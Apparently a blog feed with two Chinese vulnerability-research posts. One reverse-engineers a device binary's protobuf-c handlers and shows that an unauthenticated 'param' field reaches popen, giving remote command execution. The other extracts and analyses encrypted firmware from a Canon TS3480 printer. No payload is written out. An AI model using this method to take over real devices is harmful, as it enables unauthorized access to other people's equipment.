class="line">unzip protobuf-all-21.11.zip</span><br><span class="line"><span class="built_in">cd</span> protobuf-21.11</span><br><span class="line">./autogen.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p>然后继续安装protobuf-c</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/protobuf-c/protobuf-c.git</span><br><span class="line"><span class="built_in">cd</span> protobuf-c</span><br><span class="line">./configure &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>安装成功之后有如下几个目录</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811141411871.png" alt="image-20230811141411871"></p><p>在lib目录下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811141449986.png" alt="image-20230811141449986"></p><p>把<code>libprotobuf-c.so.1.0.0</code>丢入IDA，导出结构体。</p><p>注意，导入结构体后需要修改一下size_t的大小为__int32</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> __int32 <span class="type">size_t</span>;</span><br></pre></td></tr></table></figure><p>protobuf_c_message_unpack的函数原型如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protobuf_c_message_unpack(</span><br><span class="line"><span class="type">const</span> ProtobufCMessageDescriptor *descriptor,</span><br><span class="line">ProtobufCAllocator *allocator,</span><br><span class="line"><span class="type">size_t</span> len,</span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span> *data);</span><br></pre></td></tr></table></figure><p>然后将IDA中的函数的变量重新设置</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811151335218.png" alt="image-20230811151335218"></p><p>不光<code>protobuf_c_message_unpack</code>，还有其他protobuf-c的函数也一并重新设置变量类型</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811145941211.png" alt="image-20230811145941211"></p><p>看到<code>sub_21328</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811151501754.png" alt="image-20230811151501754"></p><p>看起来是对json数据进行解析的函数</p><p>跟入到<code>sub_212C8</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811151733045.png" alt="image-20230811151733045"></p><p>发现了<code>json_object_iter_key</code>等函数，还是Google一下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811151832679.png" alt="image-20230811151832679"></p><p>发现是这个开源库，依然是老样子，源码编译恢复符号表</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/akheron/jansson.git</span><br><span class="line"><span class="built_in">cd</span> jansson</span><br><span class="line">autoreconf -i</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>恢复后如下所示</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811153721454.png" alt="image-20230811153721454"></p><p>经过上面的重命名之后，再看回到<code>sub_19600</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811155748167.png" alt="image-20230811155748167"></p><p>关注一下这个<code>descriptor</code>，其类型是<code>ProtobufCMessageDescriptor</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessageDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Magic value checked to ensure that the API is used correctly. */</span></span><br><span class="line"><span class="type">uint32_t</span>magic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The qualified name (e.g., &quot;namespace.Type&quot;). */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*name;</span><br><span class="line"><span class="comment">/** The unqualified name as given in the .proto file (e.g., &quot;Type&quot;). */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*short_name;</span><br><span class="line"><span class="comment">/** Identifier used in generated C code. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*c_name;</span><br><span class="line"><span class="comment">/** The dot-separated namespace. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*package_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Size in bytes of the C structure representing an instance of this</span></span><br><span class="line"><span class="comment"> * type of message.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">size_t</span>sizeof_message;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number of elements in `fields`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_fields;</span><br><span class="line"><span class="comment">/** Field descriptors, sorted by tag number. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCFieldDescriptor*fields;</span><br><span class="line"><span class="comment">/** Used for looking up fields by name. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span>*fields_sorted_by_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number of elements in `field_ranges`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_field_ranges;</span><br><span class="line"><span class="comment">/** Used for looking up fields by id. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCIntRange*field_ranges;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Message initialisation function. */</span></span><br><span class="line">ProtobufCMessageInitmessage_init;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved1;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811160103536.png" alt="image-20230811160103536"></p><p>这个结构体用于描述和表示一个Protocol Buffers消息类型。</p><p>根据这个结构体，我们可以得出很多信息</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814144717091.png" alt="image-20230814144717091"></p><p>这四个数据分别对应着magic，name，short_name和c_name。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814144855125.png" alt="image-20230814144855125"></p><p>而下面的这些数据，挑一点重要的来讲，<code>0x30</code>表示根据这个protobuf消息类型实例化的c语言结构体的大小为0x30字节。</p><p>7表示fields数组的数量，fields数组是标签号排序的字段描述符数组，用于说明结构体中的各个字段的类型大小等等，fields数组的类型是</p><p><code>ProtobufCFieldDescriptor*</code>，我们看到fields数组：</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814145519381.png" alt="image-20230814145519381"></p><p><code>ProtobufCFieldDescriptor</code>的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line"><span class="type">uint32_t</span>id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">ProtobufCLabellabel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The type of the field. */</span></span><br><span class="line">ProtobufCTypetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment"> * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment"> * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span>quantifier_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment"> * itself.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span>offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A type-specific descriptor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment"> * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment"> * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*default_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment"> * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">uint32_t</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">unsigned</span>reserved_flags;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814150356075.png" alt="image-20230814150356075"></p><p>开头的version，username，token等等字符串就是发包时需要的参数，这一点在我们抓取到的网络包中可以看出来</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814150504434.png" alt="image-20230814150504434"></p><p><code>PROTOBUF_C_LABEL_NONE</code>是在protobuf-c库中定义的一个枚举常量，用于表示Protocol Buffers消息字段的标签类型。</p><p>在protobuf-c库中，字段标签类型可以是以下之一：</p><ul><li><code>PROTOBUF_C_LABEL_REQUIRED</code>：表示字段是必需的，每个消息实例都必须包含该字段。</li><li><code>PROTOBUF_C_LABEL_OPTIONAL</code>：表示字段是可选的，每个消息实例可以选择包含该字段。</li><li><code>PROTOBUF_C_LABEL_REPEATED</code>：表示字段是可重复的，每个消息实例可以包含多个该字段的值。</li></ul><p>而<code>PROTOBUF_C_LABEL_NONE</code>则表示字段没有标签类型，即该字段无效或未设置标签类型。</p><p>可以看到，在七个数组元素中</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814150700887.png" alt="image-20230814150700887"></p><p>只有params这个元素是可以重复的，那么这个重复是怎么体现出来的，还是看到我们上面抓的包</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814150805176.png" alt="image-20230814150805176"></p><p>也就是字符串数组的形式。</p><p>注意到，在cmd这个元素中，有一个地址引起了我们的关注</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814153258180.png" alt="image-20230814153258180"></p><p>这里对应的是<code>ProtobufCFieldDescriptor</code>中的descriptor成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A type-specific descriptor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment"> * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment"> * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br></pre></td></tr></table></figure><p>如果类型是<code>PROTOBUF_C_TYPE_ENUM</code>，那么<code>descriptor</code>就是指向<code>ProtobufCEnumDescriptor</code>类型的指针变量。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814153810656.png" alt="image-20230814153810656"></p><p>我们将这一段设置为<code>ProtobufCEnumDescriptor</code>类型，</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814155244975.png" alt="image-20230814155244975"></p><p><code>ProtobufCEnumDescriptor</code>定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCEnumDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Magic value checked to ensure that the API is used correctly. */</span></span><br><span class="line"><span class="type">uint32_t</span>magic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The qualified name (e.g., &quot;namespace.Type&quot;). */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*name;</span><br><span class="line"><span class="comment">/** The unqualified name as given in the .proto file (e.g., &quot;Type&quot;). */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*short_name;</span><br><span class="line"><span class="comment">/** Identifier used in generated C code. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*c_name;</span><br><span class="line"><span class="comment">/** The dot-separated namespace. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*package_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number elements in `values`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_values;</span><br><span class="line"><span class="comment">/** Array of distinct values, sorted by numeric value. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCEnumValue*values;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number of elements in `values_by_name`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_value_names;</span><br><span class="line"><span class="comment">/** Array of named values, including aliases, sorted by name. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCEnumValueIndex*values_by_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number of elements in `value_ranges`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_value_ranges;</span><br><span class="line"><span class="comment">/** Value ranges, for faster lookups by numeric value. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCIntRange*value_ranges;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved1;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved3;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved4;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814155302130.png" alt="image-20230814155302130"></p><p>其中的values就是cmd这个字段的可选值，这个values的类型为<code>ProtobufCEnumValue</code></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814155357530.png" alt="image-20230814155357530"></p><p>cmd的可选值一共有27种，在其中我们注意到两个敏感的词</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814155738949.png" alt="image-20230814155738949"></p><p>system和popen作为两个危险函数需要格外关注，而在这里出现在了cmd的可选值中，是不是意味着有对应的函数能够执行类似system和popen的功能？</p><p>那么，这些个功能在哪里执行，对应的函数又是怎么样的？继续看回到<code>sub_19600</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814214523177.png" alt="image-20230814214523177"></p><p>在这里有一个函数表的调用</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814214807135.png" alt="image-20230814214807135"></p><p>正好是27个函数，我们可以推断，这里的27个函数对应着cmd可以执行的27个功能</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814214912946.png" alt="image-20230814214912946"></p><p>而popen和system功能正好是倒数第2个第3个功能，我们在函数表中查看一下倒数第二和倒数第三个函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814215120581.png" alt="image-20230814215120581"></p><p>如我们所见，倒数第二个函数确实使用了popen来执行命令，这个命令来自于哪里？</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814215512325.png" alt="image-20230814215512325"></p><p>偏移0x20处，要知道，传入到函数中的参数是一个结构体，在上面已经讲过了</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814215633480.png" alt="image-20230814215633480"></p><p>而param位于这个结构体的偏移为0x20处，所以传入popen的参数实际上就是param的值，如果我们控制了param的值就能够使用popen来进行任意命令执行。</p><p>这是第一个漏洞。</p><p>有了命令执行，如果不能够未授权执行那依然相当鸡肋。</p><p>我们可以看到，在整个执行过程中并没有任何校验的代码，哪怕结构体中有<code>username</code>和<code>token</code>，但其类型也是<code>PROTOBUF_C_LABEL_NONE</code>，即传参过程中可有可无，所以即使我们只发送一个param过去也依然能够被程序正常处理，这样就能够导致未授权的RCE。</p><p>shell如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20240109205119969.png" alt="image-20240109205119969"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-攻击面分析&quot;&gt;&lt;a href=&quot;#1-攻击面分析&quot; class=&quot;headerlink&quot; title=&quot;1.攻击面分析&quot;&gt;&lt;/a&gt;1.攻击面分析&lt;/h1&gt;&lt;p&gt;扫描所有的TCP端口&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>TS3480折腾记录</title>
    <link href="http://example.com/2024/01/09/TS3480%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/"/>
    <id>http://example.com/2024/01/09/TS3480%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/</id>
    <published>2024-01-09T13:31:07.000Z</published>
    <updated>2024-03-14T06:43:49.264Z</updated>
    
    <content type="html"><![CDATA[<p>端口扫描，TCP端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">80/tcp   open  http</span><br><span class="line">443/tcp  open  ssl/https?</span><br><span class="line">515/tcp  open  printer</span><br><span class="line">631/tcp  open  ssl/ipp</span><br><span class="line">9100/tcp open  jetdirect?</span><br></pre></td></tr></table></figure><p>UDP端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE         SERVICE      VERSION</span><br><span class="line">67/udp    open|filtered dhcps</span><br><span class="line">68/udp    open|filtered dhcpc</span><br><span class="line">161/udp   open          snmp         SNMPv1 server; CANON Inc. SNMPv3 server (public)</span><br><span class="line">1900/udp  open|filtered upnp</span><br><span class="line">1901/udp  open|filtered fjicl-tep-a</span><br><span class="line">3702/udp  open|filtered ws-discovery</span><br><span class="line">5353/udp  open          mdns         DNS-based service discovery</span><br><span class="line">5355/udp  open|filtered llmnr</span><br><span class="line">54721/udp open|filtered unknown</span><br><span class="line">54726/udp open|filtered unknown</span><br></pre></td></tr></table></figure><p>官网没有固件，打印机走的https流量，抓不到东西，打印机设置了http代理之后抓到了这么个流量</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230505150025159.png" alt="image-20230505150025159"></p><p>但是不是固件，只有几百字节，而且没有可见字符</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230505172135971.png" alt="image-20230505172135971"></p><p>个人猜测这是一个加密之后的存有固件下载链接的文件，打印机将其下载之后进行解密得到固件更新地址。</p><p>还是直接拆设备提固件吧，经过一顿折腾，拆下来了pcb板</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403092035662.png" alt="image-20230506144657983"></p><p>flash上的丝印为<code>winbond25Q128JVSQ</code>，一款winbond公司的16MB大小的flash</p><p>热风枪吹下来用编程器进行提取，吹下来的时候不小心力气用大了一点把焊盘给拉起来了，不知道焊回去了还能不能用</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230506164656961.png" alt="image-20230506164656961"></p><p>可惜的是，从flash上提取下来的固件居然也是加密状态，只有极少数可见字符串</p><p>binwalk -E走一波</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230506164840390.png" alt="image-20230506164840390"></p><p>看那几道几乎水平的熵值，就知道这肯定有加密或这被压缩过了。</p><p>加密的固件必不可能运行，所以在被运行之前肯定有一个解密的过程。解密的过程通常由bootloader来完成，我们知道嵌入式系统在上电之后会先运行bootload初始化硬件并加载内核，所以bootloader肯定是不能处于加密状态的，bootloader都加密了那整个固件就没有一个可以运行的部分了。</p><p>对于有些设备，bootloader和固件是存在一个flash中的，而有些设备则是一个8M或者其他大小的flash用于存储flash，另一个NAND flash或者emmc用于存放固件。对于ts3480这款打印机而言只有一个16MB的flash，其bootloader和固件是存在一起的。</p><p>根据前面的分析，固件虽然处于加密状态，但肯定是有一小段未加密的数据的，这些数据我们要重点关注，其中应该会存在解密固件的关键。</p><p>binwalk -A 走一波，看看哪里能够识别成指令</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230506174309488.png" alt="image-20230506174309488"></p><p>最开始的指令是<code>0x2E00FC</code>处，用010打开</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230507162154433.png" alt="image-20230507162154433"></p><p>实际上，从0x2E0000开始才是有指令的位置，IDA打开并在0x2E0000处进行反编译</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230507162507898.png" alt="image-20230507162507898"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230507162745498.png" alt="image-20230507162745498"></p><p>注意到<code>0xF02E0190</code>这个值，我们跳转到0x2E0190处看看</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230507162841120.png" alt="image-20230507162841120"></p><p>很巧，0x2E0190处正好是一段数据，所以猜测flash的加载地址为0xf0000000,重新设置flash的加载地址</p><p>继续往下看</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230507173338640.png" alt="image-20230507173338640"></p><p>将从0xF02E058C开始的数据拷贝到0x400000处，拷贝长度为0x36d4</p><p>在这里可以使用如下命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=ts3480.BIN of=first_ram_cpoy.bin bs=1 count=14036 skip=3016076</span><br></pre></td></tr></table></figure><p>将0xF02E058C处的数据，也就是固件偏移为0x2E058C处、长度为0x36d4的数据提取出来</p><p>然后新建一个段</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230507194211122.png" alt="image-20230507194211122"></p><p>再使用IDA的附加二进制文件的功能</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403092036123.png" alt="image-20230507194251566"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230507194329773.png" alt="image-20230507194329773"></p><p>将这一段数据添加到我们刚刚创建好的段中，这样一来就模拟了前面的数据拷贝的操作。</p><p>再看到sub_F02E04F0函数，这个函数又会执行0x400312处的函数，而0x400000-0x4036d4处的数据已经被设置为了0xF02E058C处的数据</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230507193612002.png" alt="image-20230507193612002"></p><p>而sub_400312如下所示</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230507193957812.png" alt="image-20230507193957812"></p><p>跟进到sub_40017A函数中</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230507194846086.png" alt="image-20230507194846086"></p><p>很乱，不知所云，继续看到sub_402B44函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230507200625833.png" alt="image-20230507200625833"></p><p>根据函数内容恢复了两个可能的函数名，后续进入到一个类似于解压缩功能的函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403092036906.png" alt="image-20230507202024683"></p><p>函数非常大，有一千多行，其中有一些关键的字符串帮助我们确定函数的功能是用来解压缩的，如下所示</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230507202214006.png" alt="image-20230507202214006"></p><p>后面的sub_4009A0函数意义不明，猜测用于解压缩后的收尾工作，回溯到上一层函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508184516134.png" alt="image-20230508184516134"></p><p>看到这，0xF12E6000并不在我们定义的地址范围内，flash的加载地址为0xF0000000，我们看到固件中偏移为0x2E6000处正好是一段数据的起始部分</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508192055595.png" 